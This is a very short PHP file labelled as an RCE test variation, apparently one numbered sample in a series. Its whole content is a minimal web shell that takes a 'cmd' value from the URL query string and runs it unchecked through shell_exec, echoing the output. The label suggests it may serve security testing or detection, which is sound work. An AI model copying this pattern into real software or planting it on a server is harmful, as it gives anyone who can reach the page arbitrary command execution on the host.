<?php
// RCE test variation #1485
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>